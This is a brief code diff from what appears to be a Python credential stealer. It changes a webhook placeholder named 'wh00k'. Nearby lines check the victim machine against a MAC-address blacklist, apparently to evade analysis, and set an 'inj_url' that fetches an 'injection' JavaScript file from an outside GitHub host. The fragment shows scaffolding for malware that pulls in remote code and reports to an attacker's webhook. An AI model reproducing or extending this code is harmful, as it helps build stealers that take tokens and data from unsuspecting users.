@@ -52,7 +52,7 @@ if str(uuid.UUID(int=mac_address)) in BLACKLIST1:
 
 
 
-wh00k = "WEBHOOK HERE"
+wh00k = "WEBHOOK"
 inj_url = "https://raw.githubusercontent.com/xCynicalHD/injection/main/index.js"
     
 DETECTED = False
